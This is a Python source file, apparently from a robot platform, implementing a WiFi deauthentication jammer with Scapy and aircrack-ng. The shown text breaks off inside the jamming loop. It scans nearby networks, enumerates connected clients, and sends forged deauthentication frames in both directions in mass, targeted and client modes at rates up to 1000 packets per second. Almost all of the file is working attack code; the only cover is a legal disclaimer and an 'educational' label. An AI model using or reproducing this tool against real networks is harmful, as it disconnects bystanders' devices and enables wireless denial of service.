"""
WiFi Deauthentication Attack Module (Educational/Research)
========================================================

This module implements a WiFi deauthentication attack for educational
and authorized security testing purposes only.

IMPORTANT LEGAL WARNING:
- Only use on networks you own or have explicit written permission to test
- Unauthorized use is illegal and unethical
- This is for educational/research purposes only
- Users are solely responsible for their actions

Technical Implementation:
- Uses Scapy to craft 802.11 deauthentication frames
- Supports mass and targeted attack modes
- Protects the robot's own management network (wlan0)
- Runs in isolated thread to avoid blocking robot control
"""

import csv
import logging
import os
import re
import subprocess
import threading
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple
import json

try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Deauth, sendp, conf,
        wrpcap, rdpcap, AsyncSniffer
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logging.warning("Scapy not available - WiFi jammer will not function")

logger = logging.getLogger(__name__)


class JammerMode(str, Enum):
    """Attack mode enumeration"""
    MASS = "mass"           # Attack all selected networks
    TARGETED = "targeted"   # Attack specific BSSID
    CLIENT = "client"       # Attack specific clients on networks


class JammerState(str, Enum):
    """Jammer state enumeration"""
    IDLE = "idle"
    SCANNING = "scanning"
    RUNNING = "running"
    ERROR = "error"


@dataclass
class ClientInfo:
    """Information about a client device connected to a network"""
    mac: str
    bssid: str  # The AP this client is connected to
    signal_strength: int = 0
    is_robot_device: bool = False

    def to_dict(self) -> dict:
        """Convert to dictionary for JSON serialization"""
        return {
            "mac": self.mac,
            "bssid": self.bssid,
            "signal_strength": self.signal_strength,
            "is_robot_device": self.is_robot_device
        }


@dataclass
class NetworkInfo:
    """Information about a discovered WiFi network"""
    bssid: str
    essid: str = ""
    channel: int = 0
    signal_strength: int = 0
    encryption: str = ""
    is_robot_network: bool = False
    clients: List[ClientInfo] = field(default_factory=list)

    def to_dict(self) -> dict:
        """Convert to dictionary for JSON serialization"""
        return {
            "bssid": self.bssid,
            "essid": self.essid or "(Hidden)",
            "channel": self.channel,
            "signal_strength": self.signal_strength,
            "encryption": self.encryption,
            "is_robot_network": self.is_robot_network,
            "clients": [client.to_dict() for client in self.clients],
            "client_count": len(self.clients)
        }


@dataclass
class JammerStatus:
    """Current status of the WiFi jammer"""
    state: JammerState = JammerState.IDLE
    mode: Optional[JammerMode] = None
    target_bssid: Optional[str] = None
    target_macs: List[str] = field(default_factory=list)
    channel: Optional[int] = None
    packets_sent: int = 0
    start_time: Optional[float] = None
    uptime_seconds: float = 0.0
    error_message: str = ""
    networks_discovered: int = 0
    clients_discovered: int = 0
    robot_network_bssid: Optional[str] = None
    robot_network_essid: Optional[str] = None
    robot_mac: Optional[str] = None


class WifiJammer:
    """
    WiFi Deauthentication Jammer for Educational Security Research

    This class implements a safe and controlled WiFi deauthentication attack
    that protects the robot's own management network while allowing authorized
    security testing on other networks.

    Features:
    - Mass deauthentication of selected networks
    - Targeted deauthentication of specific BSSIDs
    - Automatic protection of robot's own network
    - Thread-safe operation
    - Comprehensive status reporting
    """

    def __init__(self, monitor_interface: str = "wlan1", management_interface: str = "wlan0"):
        """
        Initialize the WiFi jammer

        Args:
            monitor_interface: WiFi interface for monitor mode (default: wlan1)
            management_interface: WiFi interface for robot management (default: wlan0)
        """
        if not SCAPY_AVAILABLE:
            raise RuntimeError("Scapy is required but not installed. Install with: pip install scapy")

        # Check if aircrack-ng is available
        if not self._check_aircrack_ng():
            logger.warning("Aircrack-ng suite not found. Network scanning and client discovery may not work properly.")
            logger.warning("Install with: sudo apt-get install aircrack-ng")

        self.monitor_interface = monitor_interface
        self.management_interface = management_interface

        # Thread management
        self._stop_event = threading.Event()
        self._jammer_thread: Optional[threading.Thread] = None
        self._scan_thread: Optional[threading.Thread] = None

        # Status tracking
        self._status = JammerStatus()
        self._status_lock = threading.Lock()

        # Network protection
        self._robot_network_bssid: Optional[str] = None
        self._robot_network_essid: Optional[str] = None
        self._robot_mac: Optional[str] = None
        self._protected_networks: set = set()
        self._protected_macs: set = set()  # Protected MAC addresses (like robot's MAC)

        # Configuration
        self._default_packet_rate = 200  # packets per second (increased for effectiveness)
        self._max_packet_rate = 1000  # increased max rate

        # Scan results
        self._scan_results: List[NetworkInfo] = []
        self._scan_lock = threading.Lock()

        logger.info(f"WiFi Jammer initialized - Monitor: {monitor_interface}, Management: {management_interface}")

    def _check_aircrack_ng(self) -> bool:
        """Check if aircrack-ng suite is installed"""
        try:
            result = subprocess.run(
                ["which", "airodump-ng"],
                capture_output=True,
                text=True,
                timeout=2
            )
            return result.returncode == 0
        except Exception:
            return False

    def _check_scapy(self) -> bool:
        """Check if Scapy is available"""
        return SCAPY_AVAILABLE

    def _update_status(self, **kwargs) -> None:
        """Thread-safe status update"""
        with self._status_lock:
            for key, value in kwargs.items():
                if hasattr(self._status, key):
                    setattr(self._status, key, value)

            # Update uptime if running
            if self._status.state == JammerState.RUNNING and self._status.start_time:
                self._status.uptime_seconds = time.time() - self._status.start_time

    def get_status(self) -> dict:
        """Get current jammer status"""
        with self._status_lock:
            status_dict = {
                "state": self._status.state.value,
                "mode": self._status.mode.value if self._status.mode else None,
                "target_bssid": self._status.target_bssid,
                "target_macs": self._status.target_macs,
                "channel": self._status.channel,
                "packets_sent": self._status.packets_sent,
                "uptime_seconds": round(self._status.uptime_seconds, 2),
                "error_message": self._status.error_message,
                "networks_discovered": self._status.networks_discovered,
                "clients_discovered": self._status.clients_discovered,
                "robot_network_bssid": self._status.robot_network_bssid,
                "robot_network_essid": self._status.robot_network_essid,
                "robot_mac": self._status.robot_mac
            }
        return status_dict

    def get_robot_network(self) -> dict:
        """Get information about the robot's own network and device"""
        self._detect_robot_network()
        return {
            "bssid": self._robot_network_bssid,
            "essid": self._robot_network_essid,
            "mac": self._robot_mac,
            "interface": self.management_interface
        }

    def _detect_robot_network(self) -> None:
        """Detect the network the robot is currently connected to and its MAC address"""
        try:
            result = subprocess.run(
                ["iw", "dev", self.management_interface, "link"],
                capture_output=True,
                text=True,
                timeout=5
            )

            bssid = None
            essid = None
            mac = None

            for line in result.stdout.splitlines():
                line = line.strip()
                if "Connected to" in line:
                    bssid = line.split("Connected to")[1].split()[0].strip().upper()
                elif "SSID:" in line:
                    essid = line.split("SSID:")[1].strip().strip('"')
                elif "tx bitrate" in line or "rx bitrate" in line:
                    # MAC address is usually shown before bitrate info
                    parts = line.split()
                    for part in parts:
                        if ":" in part and len(part) == 17:  # MAC format XX:XX:XX:XX:XX:XX
                            mac = part.upper()
                            break

            # Try alternative method to get MAC address
            if not mac:
                try:
                    mac_result = subprocess.run(
                        ["ip", "link", "show", self.management_interface],
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    for line in mac_result.stdout.splitlines():
                        if "link/ether" in line:
                            mac = line.split("link/ether")[1].split()[0].strip().upper()
                            break
                except Exception:
                    pass

            if bssid:
                self._robot_network_bssid = bssid
                self._robot_network_essid = essid
                self._protected_networks.add(bssid)

                if mac:
                    self._robot_mac = mac
                    self._protected_macs.add(mac)

                with self._status_lock:
                    self._status.robot_network_bssid = bssid
                    self._status.robot_network_essid = essid
                    self._status.robot_mac = mac

                logger.info(f"Robot network detected - BSSID: {bssid}, ESSID: {essid}, MAC: {mac}")
            else:
                logger.warning(f"No network detected on {self.management_interface}")

        except subprocess.TimeoutExpired:
            logger.error(f"Timeout detecting network on {self.management_interface}")
        except Exception as e:
            logger.error(f"Error detecting robot network: {e}")

    @staticmethod
    def _is_mac_address(value: str) -> bool:
        """Return True when the value looks like a Wi-Fi MAC address."""
        return bool(re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', value.strip()))

    @staticmethod
    def _normalise_mac(value: Optional[str]) -> str:
        return value.strip().upper() if value else ""

    def _parse_airodump_client_lines(self, lines: List[str], bssid: str) -> List[ClientInfo]:
        """Parse the Station MAC section from airodump-ng CSV output."""
        clients: List[ClientInfo] = []
        target_bssid = self._normalise_mac(bssid)
        robot_mac = self._normalise_mac(self._robot_mac)
        station_columns: Optional[Dict[str, int]] = None

        for row in csv.reader(lines, skipinitialspace=True):
            if not row or not any(cell.strip() for cell in row):
                continue

            first_cell = row[0].strip()
            if first_cell == "Station MAC":
                station_columns = {
                    cell.strip().lower(): index
                    for index, cell in enumerate(row)
                    if cell.strip()
                }
                continue

            if station_columns is None:
                continue

            mac_index = station_columns.get("station mac", 0)
            bssid_index = station_columns.get("bssid")
            power_index = station_columns.get("power")

            if len(row) <= mac_index:
                continue

            mac = self._normalise_mac(row[mac_index])
            if not self._is_mac_address(mac) or mac == target_bssid:
                continue

            if bssid_index is not None and len(row) > bssid_index:
                client_bssid = self._normalise_mac(row[bssid_index])
                if self._is_mac_address(client_bssid) and client_bssid != target_bssid:
                    continue
                if client_bssid in {"(NOT ASSOCIATED)", "NOT-ASSOCIATED"}:
                    continue

            signal = 0
            if power_index is not None and len(row) > power_index:
                try:
                    signal = int(float(row[power_index].strip()))
                except ValueError:
                    signal = 0

            clients.append(ClientInfo(
                mac=mac,
                bssid=target_bssid,
                signal_strength=signal,
                is_robot_device=mac == robot_mac
            ))

        return clients

    def _discover_clients(self, bssid: str, channel: int, duration: int = 25) -> List[ClientInfo]:
        """Discover clients connected to a specific access point using airodump-ng"""
        clients = []
        temp_file = f"/tmp/airodump_clients_{uuid.uuid4().hex[:8]}"

        try:
            logger.info(f"Starting client discovery for BSSID {bssid} on channel {channel}")

            # airodump-ng needs monitor mode for passive station discovery.
            if not self._set_monitor_mode():
                logger.error("Failed to set monitor mode, cannot discover clients")
                return clients

            # Set channel for client discovery
            if not self._set_channel(channel):
                logger.error(f"Failed to set channel {channel}, cannot discover clients")
                self._set_managed_mode()
                return clients

            # Verify channel was actually set and allow it to stabilize
            verify_result = subprocess.run(
                ["iw", "dev", self.monitor_interface, "info"],
                capture_output=True,
                text=True,
                timeout=5
            )
            logger.info(f"Interface state before airodump-ng: {verify_result.stdout}")
            time.sleep(0.5)  # Allow channel to stabilize before starting airodump-ng

            logger.debug(f"Discovering clients for AP {bssid} on channel {channel} using airodump-ng")

            # Verify airodump-ng is in PATH
            which_result = subprocess.run(
                ["which", "airodump-ng"],
                capture_output=True,
                text=True,
                timeout=2
            )
            logger.info(f"airodump-ng location: {which_result.stdout.strip()}")
            if which_result.returncode != 0:
                logger.error("airodump-ng not found in PATH")
                return clients

            # Use airodump-ng to passively discover clients.
            cmd = [
                "airodump-ng",
                "--bssid", bssid,
                "-c", str(channel),
                "--output-format", "csv",
                "--write-interval", "1",
                "-w", temp_file,
                self.monitor_interface
            ]

            logger.debug(f"Running command: {' '.join(cmd)}")

            process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,  # never read; avoid pipe-buffer deadlock under systemd
                stderr=subprocess.PIPE,
                text=True
            )

            # Let it run long enough to observe normal client traffic.
            try:
                process.wait(timeout=duration)
            except subprocess.TimeoutExpired:
                logger.debug(f"Client discovery timeout after {duration}s, terminating airodump-ng")
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    logger.warning("airodump-ng did not terminate gracefully, killing")
                    process.kill()
                    try:
                        process.wait(timeout=2)
                    except subprocess.TimeoutExpired:
                        logger.error("airodump-ng process could not be killed")
                        pass

            # Log airodump-ng exit status and any stderr output so failures
            # are visible in the systemd journal instead of silently returning
            # an empty client list.
            exit_code = process.returncode
            stderr_output = ""
            try:
                stderr_output = process.stderr.read()
            except Exception:
                pass
            if "command not found" in stderr_output:
                logger.error("airodump-ng not found in PATH")
                return clients
            # SIGTERM (-15) and SIGKILL (-9) are expected termination signals
            if exit_code not in (0, None, -15, -9):
                logger.warning(
                    "airodump-ng exited with unexpected code %d: %s",
                    exit_code,
                    stderr_output.strip()[:300],
                )
            elif stderr_output.strip():
                logger.debug("airodump-ng stderr: %s", stderr_output.strip()[:300])

            # Verify what files were actually created
            import glob
            csv_files = glob.glob(f"{temp_file}*")
            logger.info(f"Files created by airodump-ng: {csv_files}")

            # Parse the CSV output for client information
            csv_file = f"{temp_file}-01.csv"
            if os.path.exists(csv_file):
                # Log CSV file content for debugging
                with open(csv_file, 'r') as f:
                    content = f.read()
                logger.debug(f"CSV file content (first 500 chars):\n{content[:500]}")

                try:
                    with open(csv_file, 'r') as f:
                        lines = f.readlines()

                    logger.debug(f"Read {len(lines)} lines from CSV file")
                    clients = self._parse_airodump_client_lines(lines, bssid)

                except Exception as e:
                    logger.error(f"Error parsing airodump-ng output: {e}")
                    import traceback
                    logger.error(traceback.format_exc())

                # Clean up temporary files
                try:
                    for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                        temp_path = f"{temp_file}{ext}"
                        if os.path.exists(temp_path):
                            os.remove(temp_path)
                            logger.debug(f"Cleaned up {temp_path}")
                except Exception as e:
                    logger.debug(f"Error cleaning up temp files: {e}")
            else:
                logger.warning(f"CSV file not found: {csv_file}")

            logger.info(f"Discovered {len(clients)} clients for AP {bssid}")

        except FileNotFoundError:
            logger.error("airodump-ng not found. Please install aircrack-ng suite:")
            logger.error("  sudo apt-get install aircrack-ng")
        except Exception as e:
            logger.error(f"Error discovering clients for {bssid}: {e}")
            import traceback
            logger.error(traceback.format_exc())
        finally:
            # Always try to reset to managed mode
            try:
                self._set_managed_mode()
            except Exception as e:
                logger.error(f"Error resetting to managed mode: {e}")

        return clients

    def discover_network_clients(self, bssid: str, channel: int, duration: int = 25) -> List[dict]:
        """
        Discover clients on a specific network

        Args:
            bssid: Target network BSSID
            channel: Network channel

        Returns:
            List of discovered clients
        """
        if self._status.state == JammerState.RUNNING:
            logger.warning("Cannot discover clients while jammer is running")
            return []

        self._update_status(state=JammerState.SCANNING)

        try:
            duration = max(5, min(int(duration), 60))
            clients = self._discover_clients(bssid, channel, duration=duration)

            with self._status_lock:
                self._status.clients_discovered = len(clients)

            self._update_status(state=JammerState.IDLE)

            logger.info(f"Client discovery complete - Found {len(clients)} clients on {bssid}")
            return [client.to_dict() for client in clients]

        except Exception as e:
            logger.error(f"Client discovery failed: {e}")
            self._update_status(state=JammerState.ERROR, error_message=str(e))
            return []
        finally:
            self._set_managed_mode()

    def _set_monitor_mode(self) -> bool:
        """Set the WiFi interface to monitor mode"""
        try:
            logger.info(f"Setting {self.monitor_interface} to monitor mode...")

            # Release the interface from NetworkManager / wpa_supplicant so they
            # do not fight us while we are in monitor mode.  Both calls are
            # best-effort; errors are ignored when the tools are absent.
            for _release_cmd in [
                ["nmcli", "device", "set", self.monitor_interface, "managed", "no"],
                ["pkill", "-f", f"wpa_supplicant.*{re.escape(self.monitor_interface)}"],
            ]:
                try:
                    subprocess.run(_release_cmd, capture_output=True, timeout=3)
                except Exception:
                    pass
            time.sleep(0.3)  # let NM/wpa_supplicant notice before we take the interface down

            # Bring interface down
            result = subprocess.run(
                ["ip", "link", "set", self.monitor_interface, "down"],
                check=True,
                capture_output=True,
                timeout=10
            )
            logger.debug(f"Interface {self.monitor_interface} brought down")

            # Set monitor mode
            result = subprocess.run(
                ["iw", "dev", self.monitor_interface, "set", "type", "monitor"],
                check=True,
                capture_output=True,
                timeout=10
            )
            logger.debug(f"Interface {self.monitor_interface} set to monitor mode")

            # Bring interface up
            result = subprocess.run(
                ["ip", "link", "set", self.monitor_interface, "up"],
                check=True,
                capture_output=True,
                timeout=10
            )
            logger.debug(f"Interface {self.monitor_interface} brought up")
            time.sleep(0.5)  # allow the driver to complete mode transition

            # Verify monitor mode
            verify_result = subprocess.run(
                ["iw", "dev", self.monitor_interface, "info"],
                capture_output=True,
                text=True,
                timeout=5
            )
            if "type monitor" in verify_result.stdout:
                logger.info(f"Successfully set {self.monitor_interface} to monitor mode")
                return True
            else:
                logger.error(f"Failed to verify monitor mode: {verify_result.stdout}")
                return False

        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to set monitor mode: {e}")
            logger.error(f"stderr: {e.stderr}")
            self._update_status(state=JammerState.ERROR, error_message=str(e))
            return False
        except subprocess.TimeoutExpired:
            logger.error("Timeout setting monitor mode")
            self._update_status(state=JammerState.ERROR, error_message="Timeout setting monitor mode")
            return False
        except Exception as e:
            logger.error(f"Unexpected error setting monitor mode: {e}")
            self._update_status(state=JammerState.ERROR, error_message=str(e))
            return False

    def _set_managed_mode(self) -> bool:
        """Set the WiFi interface back to managed mode for normal scans."""
        try:
            logger.info(f"Resetting {self.monitor_interface} to managed mode...")

            subprocess.run(
                ["ip", "link", "set", self.monitor_interface, "down"],
                check=True,
                capture_output=True,
                timeout=5
            )
            logger.debug(f"Interface {self.monitor_interface} brought down")

            subprocess.run(
                ["iw", "dev", self.monitor_interface, "set", "type", "managed"],
                check=True,
                capture_output=True,
                timeout=5
            )
            logger.debug(f"Interface {self.monitor_interface} set to managed mode")

            subprocess.run(
                ["ip", "link", "set", self.monitor_interface, "up"],
                check=True,
                capture_output=True,
                timeout=5
            )
            logger.debug(f"Interface {self.monitor_interface} brought up")

            # Re-hand the interface back to NetworkManager so it can reconnect.
            try:
                subprocess.run(
                    ["nmcli", "device", "set", self.monitor_interface, "managed", "yes"],
                    capture_output=True,
                    timeout=3,
                )
            except Exception:
                pass

            logger.info(f"Successfully reset {self.monitor_interface} to managed mode")
            return True
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to set managed mode: {e}")
            logger.error(f"stderr: {e.stderr}")
            return False
        except subprocess.TimeoutExpired:
            logger.error("Timeout setting managed mode")
            return False
        except Exception as e:
            logger.error(f"Unexpected error setting managed mode: {e}")
            return False

    def _set_channel(self, channel: int) -> bool:
        """Set the WiFi channel"""
        try:
            result = subprocess.run(
                ["iw", "dev", self.monitor_interface, "set", "channel", str(channel)],
                check=True,
                capture_output=True,
                timeout=5
            )
            logger.debug(f"Set channel to {channel}")

            # Verify channel was set
            verify_result = subprocess.run(
                ["iw", "dev", self.monitor_interface, "info"],
                capture_output=True,
                text=True,
                timeout=5
            )
            if f"channel {channel}" in verify_result.stdout:
                logger.info(f"Successfully set channel to {channel}")
                return True
            else:
                logger.warning(f"Channel verification failed. Current state: {verify_result.stdout}")
                return True  # Still return true as the command succeeded

        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to set channel {channel}: {e}")
            logger.error(f"stderr: {e.stderr}")
            return False
        except subprocess.TimeoutExpired:
            logger.error(f"Timeout setting channel {channel}")
            return False
        except Exception as e:
            logger.error(f"Unexpected error setting channel {channel}: {e}")
            return False

    def scan_networks(self, duration: int = 10) -> List[dict]:
        """
        Scan for nearby WiFi networks using airodump-ng

        Args:
            duration: Scan duration in seconds

        Returns:
            List of discovered networks
        """
        if self._status.state == JammerState.RUNNING:
            logger.warning("Cannot scan while jammer is running")
            return []

        self._update_status(state=JammerState.SCANNING)
        self._detect_robot_network()

        try:
            logger.info(f"Starting network scan on {self.monitor_interface} using airodump-ng...")

            # Set monitor mode for scanning
            if not self._set_monitor_mode():
                logger.error("Failed to set monitor mode for scanning")
                self._update_status(state=JammerState.ERROR, error_message="Failed to set monitor mode")
                return []

            # Use airodump-ng for comprehensive network scanning
            temp_file = f"/tmp/airodump_scan_{uuid.uuid4().hex[:8]}"
            cmd = [
                "airodump-ng",
                "--output-format", "csv",
                "--write-interval", "1",
                "-w", temp_file,
                self.monitor_interface
            ]

            process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,  # never read; avoid pipe-buffer deadlock under systemd
                stderr=subprocess.PIPE,
                text=True
            )

            # Let it run for the specified duration
            try:
                process.wait(timeout=duration)
            except subprocess.TimeoutExpired:
                process.terminate()
                try:
                    process.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    process.kill()

            # Parse the CSV output for network information
            networks = []
            csv_file = f"{temp_file}-01.csv"
            if os.path.exists(csv_file):
                try:
                    with open(csv_file, 'r') as f:
                        lines = f.readlines()

                    # Find the AP section (before "Station MAC")
                    for line in lines:
                        line = line.strip()
                        if line.startswith("Station MAC"):
                            break  # End of AP section

                        if line and not line.startswith("BSSID"):
                            parts = line.split(',')
                            if len(parts) >= 14:
                                bssid = parts[0].strip().upper()
                                # Validate BSSID format
                                if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
                                    essid = parts[13].strip() if len(parts) > 13 else ""
                                    if not essid:
                                        essid = "(Hidden)"

                                    # airodump-ng CSV column 3 is the channel
                                    # number directly (e.g. 1, 6, 11) – NOT a
                                    # frequency.  Treating it as a frequency
                                    # caused every network to be reported as
                                    # channel 1, making client discovery lock
                                    # onto the wrong channel.
                                    channel = 1
                                    if len(parts) > 3:
                                        try:
                                            channel = int(parts[3].strip())
                                        except (ValueError, IndexError):
                                            pass

                                    # Get signal strength
                                    signal = -70
                                    if len(parts) > 8:
                                        try:
                                            signal = int(parts[8].strip())
                                        except (ValueError, IndexError):
                                            pass

                                    # Get encryption
                                    encryption = "Open"
                                    if len(parts) > 5:
                                        enc = parts[5].strip().upper()
                                        if "WPA" in enc:
                                            encryption = "WPA2" if "WPA2" in enc else "WPA"
                                        elif "WEP" in enc:
                                            encryption = "WEP"

                                    # Check if this is the robot's network
                                    is_robot = bssid == self._robot_network_bssid

                                    networks.append(NetworkInfo(
                                        bssid=bssid,
                                        essid=essid,
                                        channel=channel,
                                        signal_strength=signal,
                                        encryption=encryption,
                                        is_robot_network=is_robot
                                    ))

                except Exception as e:
                    logger.error(f"Error parsing airodump-ng scan output: {e}")

                # Clean up temporary files
                try:
                    for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                        temp_path = f"{temp_file}{ext}"
                        if os.path.exists(temp_path):
                            os.remove(temp_path)
                except Exception as e:
                    logger.debug(f"Error cleaning up temp files: {e}")

            if not networks:
                logger.info("airodump-ng scan found no networks; falling back to iw scan")
                self._set_managed_mode()
                result = subprocess.run(
                    ["iw", "dev", self.monitor_interface, "scan"],
                    capture_output=True,
                    text=True,
                    timeout=duration + 5
                )
                if result.returncode != 0:
                    logger.warning("iw scan fallback failed: %s", (result.stderr or "").strip())
                else:
                    networks = self._parse_scan_results(result.stdout)

            with self._scan_lock:
                self._scan_results = networks

            self._update_status(
                state=JammerState.IDLE,
                networks_discovered=len(networks)
            )

            logger.info(f"Scan complete - Found {len(networks)} networks using airodump-ng")
            return [net.to_dict() for net in networks]

        except FileNotFoundError:
            logger.error("airodump-ng not found. Please install aircrack-ng:")
            logger.error("  sudo apt-get install aircrack-ng")
            self._update_status(state=JammerState.ERROR, error_message="airodump-ng not found")
            return []
        except subprocess.TimeoutExpired:
            logger.error("Network scan timeout")
            self._update_status(state=JammerState.ERROR, error_message="Scan timeout")
            return []
        except Exception as e:
            logger.error(f"Network scan failed: {e}")
            self._update_status(state=JammerState.ERROR, error_message=str(e))
            return []
        finally:
            self._set_managed_mode()

    def _parse_scan_results(self, scan_output: str) -> List[NetworkInfo]:
        """Parse iw scan output into NetworkInfo objects"""
        networks = []
        current_network = {}

        for line in scan_output.splitlines():
            line = line.strip()

            if line.startswith("BSS "):
                # Save previous network if exists
                if current_network:
                    networks.append(self._create_network_info(current_network))

                # Start new network
                bssid = line.split("BSS ", 1)[1].split()[0].split("(", 1)[0].upper()
                current_network = {"bssid": bssid}

            elif "SSID:" in line:
                current_network["essid"] = line.split("SSID:", 1)[1].strip().strip('"') or "(Hidden)"

            elif "freq:" in line:
                freq = int(line.split("freq:", 1)[1].split()[0])
                # Convert frequency to channel (2.4 GHz)
                if 2400 <= freq <= 2500:
                    current_network["channel"] = (freq - 2407) // 5

            elif "signal:" in line:
                signal = int(float(line.split("signal:", 1)[1].split()[0]))
                current_network["signal_strength"] = signal

            elif "RSN:" in line or "WPA:" in line:
                current_network["encryption"] = "WPA/WPA2"

        # Don't forget the last network
        if current_network:
            networks.append(self._create_network_info(current_network))

        # Mark robot's network
        if self._robot_network_bssid:
            for network in networks:
                if network.bssid == self._robot_network_bssid:
                    network.is_robot_network = True
                    network.essid = self._robot_network_essid or network.essid

        return networks

    def _create_network_info(self, network_data: dict) -> NetworkInfo:
        """Create NetworkInfo object from parsed data"""
        return NetworkInfo(
            bssid=network_data.get("bssid", ""),
            essid=network_data.get("essid", ""),
            channel=network_data.get("channel", 0),
            signal_strength=network_data.get("signal_strength", 0),
            encryption=network_data.get("encryption", "Open"),
            is_robot_network=False
        )

    def _build_deauth_packet(self, target_bssid: str, client_mac: str = "ff:ff:ff:ff:ff:ff", from_ap: bool = True) -> bytes:
        """
        Build a deauthentication packet

        Args:
            target_bssid: Target access point MAC address
            client_mac: Target client MAC address (default: broadcast)
            from_ap: If True, packet appears to come from AP; if False, from client

        Returns:
            Raw deauthentication packet bytes
        """
        try:
            if from_ap:
                # Packet from AP to client (AP kicks client)
                # addr1 = client (destination)
                # addr2 = AP (source)
                # addr3 = AP (BSSID)
                # FCfield = 2 (From-DS)
                dot11 = Dot11(
                    type=0,                    # Management frame
                    subtype=12,                # Deauthentication
                    addr1=client_mac,          # Destination (client)
                    addr2=target_bssid,        # Source (AP)
                    addr3=target_bssid,        # BSSID (AP)
                    FCfield=2                  # From-DS flag (0x02)
                )
            else:
                # Packet from client to AP (client leaves network)
                # addr1 = AP (destination)
                # addr2 = client (source)
                # addr3 = AP (BSSID)
                # FCfield = 0 (To-DS or no DS)
                dot11 = Dot11(
                    type=0,                    # Management frame
                    subtype=12,                # Deauthentication
                    addr1=target_bssid,        # Destination (AP)
                    addr2=client_mac,          # Source (client)
                    addr3=target_bssid,        # BSSID (AP)
                    FCfield=0                  # No DS flag (0x00)
                )

            deauth = Dot11Deauth(reason=7)  # Reason 7: Class 3 frame received from nonassociated STA

            # Build complete packet with RadioTap header
            packet = RadioTap() / dot11 / deauth

            return packet

        except Exception as e:
            logger.error(f"Error building deauth packet: {e}")
            # Fallback to simpler packet construction
            try:
                if from_ap:
                    dot11 = Dot11(
                        type=0,
                        subtype=12,
                        addr1=client_mac,
                        addr2=target_bssid,
                        addr3=target_bssid
                    )
                    dot11.FCfield = 2
                else:
                    dot11 = Dot11(
                        type=0,
                        subtype=12,
                        addr1=target_bssid,
                        addr2=client_mac,
                        addr3=target_bssid
                    )
                    dot11.FCfield = 0

                deauth = Dot11Deauth(reason=7)
                packet = RadioTap() / dot11 / deauth
                return packet
            except Exception as e2:
                logger.error(f"Error building fallback deauth packet: {e2}")
                raise

    def _jamming_loop(
        self,
        mode: JammerMode,
        target_bssids: List[str],
        target_macs: Optional[List[str]] = None,
        channel: Optional[int] = None,
        packet_rate: int = 100,
        duration: Optional[float] = None
    ) -> None:
        """
        Main jamming loop - runs in separate thread

        Args:
            mode: Attack mode (mass, targeted, or client)
            target_bssids: List of target BSSIDs
            target_macs: List of target MAC addresses (for client mode)
            channel: WiFi channel to use
            packet_rate: Packets per second
            duration: Attack duration in seconds (None for indefinite)
        """
        start_time = time.time()
        packet_interval = 1.0 / packet_rate
        target_macs = target_macs or []
        consecutive_send_errors = 0
        max_consecutive_send_errors = 10

        logger.info(f"Jamming loop started - Mode: {mode}, BSSIDs: {len(target_bssids)}, MACs: {len(target_macs)}, Rate: {packet_rate} pps")

        try:
            # Set channel if specified
            if channel:
                self._set_channel(channel)

            while not self._stop_event.is_set():
                # Check duration limit
                if duration and (time.time() - start_time) > duration:
                    logger.info("Attack duration reached, stopping")
                    break

                # Handle different attack modes
                if (mode == JammerMode.CLIENT and target_macs) or (mode == JammerMode.MASS and target_macs):
                    # Client mode or enhanced mass mode: target specific MAC addresses with bidirectional deauth
                    for bssid in target_bssids:
                        if self._stop_event.is_set():
                            break

                        # Skip protected networks (but allow robot's network in client mode)
                        if bssid in self._protected_networks and bssid != self._robot_network_bssid:
                            logger.debug(f"Skipping protected network: {bssid}")
                            continue

                        for mac in target_macs:
                            if self._stop_event.is_set():
                                break

                            # Skip protected MACs (especially robot's MAC)
                            if mac in self._protected_macs:
                                logger.debug(f"Skipping protected MAC: {mac}")
                                continue

                            try:
                                # Send bidirectional deauth packets for maximum effectiveness
                                # 1. AP -> Client (AP kicks client)
                                packet_ap_to_client = self._build_deauth_packet(bssid, mac, from_ap=True)
                                sendp(packet_ap_to_client, iface=self.monitor_interface, verbose=0, count=1)

                                # 2. Client -> AP (Client leaves network)
                                packet_client_to_ap = self._build_deauth_packet(bssid, mac, from_ap=False)
                                sendp(packet_client_to_ap, iface=self.monitor_interface, verbose=0, count=1)

                                with self._status_lock:
                                    self._status.packets_sent += 2  # Count both packets

                                consecutive_send_errors = 0  # Reset error counter on success

                            except Exception as e:
                                logger.error(f"Error sending deauth to {mac} on {bssid}: {e}")
                                consecutive_send_errors += 1
                                if consecutive_send_errors >= max_consecutive_send_errors:
                                    self._update_status(
                                        state=JammerState.ERROR,
                                        error_message=f"Stopping after repeated send errors: {e}",
                                    )
                                    self._stop_event.set()
                                    break

                else:
                    # Mass or targeted mode: target BSSIDs with aggressive broadcast deauth
                    for bssid in target_bssids:
                        if self._stop_event.is_set():
                            break

                        # Skip protected networks
                        if bssid in self._protected_networks:
                            logger.debug(f"Skipping protected network: {bssid}")
                            continue

                        try:
                            # Send multiple broadcast deauth packets for effectiveness
                            # 1. AP → Broadcast (AP kicks everyone)
                            packet_ap_broadcast = self._build_deauth_packet(bssid, "ff:ff:ff:ff:ff:ff", from_ap=True)
                            sendp(packet_ap_broadcast, iface=self.monitor_interface, verbose=0, count=3)

                            # 2. Broadcast → AP (Everyone leaves)
                            packet_broadcast_ap = self._build_deauth_packet(bssid, "ff:ff:ff:ff:ff:ff", from_ap=False)
                            sendp(packet_broadcast_ap, iface=self.monitor_interface, verbose=0, count=3)

                            with self._status_lock:
                                self._status.packets_sent += 6  # Count all packets

                            consecutive_send_errors = 0  # Reset error counter on success

                        except Exception as e:
                            logger.error(f"Error sending deauth to {bssid}: {e}")
                            consecutive_send_errors += 1
                            if consecutive_send_errors >= max_consecutive_send_errors:
